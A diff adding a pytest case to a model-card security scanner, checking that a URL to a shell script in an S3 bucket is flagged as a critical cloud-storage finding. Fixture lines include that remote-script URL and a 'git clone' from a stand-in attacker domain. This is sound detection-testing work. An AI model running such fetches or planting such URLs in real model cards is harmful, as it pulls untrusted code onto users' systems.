@@ -202,6 +202,30 @@ def test_text_scanner_model_card_deduplicates_shared_cloud_url_evidence(tmp_path
     }
 
 
+def test_text_scanner_model_card_cloud_url_preserves_higher_actionable_severity(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('endpoint = "https://bucket.s3.amazonaws.com/cmd.sh"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    assert len(network_checks) == 1
+    check = network_checks[0]
+    assert check.severity == IssueSeverity.CRITICAL
+    assert check.details["type"] == "cloud_storage_url"
+    assert check.details["severity"] == "HIGH"
+    assert check.details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://bucket.s3.amazonaws.com/cmd.sh",
+    }
+    assert {finding["type"] for finding in check.details["deduplicated_related_findings"]} == {
+        "domain_name",
+        "url_detected",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_model_card_deduplicates_git_clone_url_evidence(tmp_path: Path) -> None:
     text_path = tmp_path / "model_card.md"
     text_path.write_text("git clone https://evil.example/repo.git\n", encoding="utf-8")
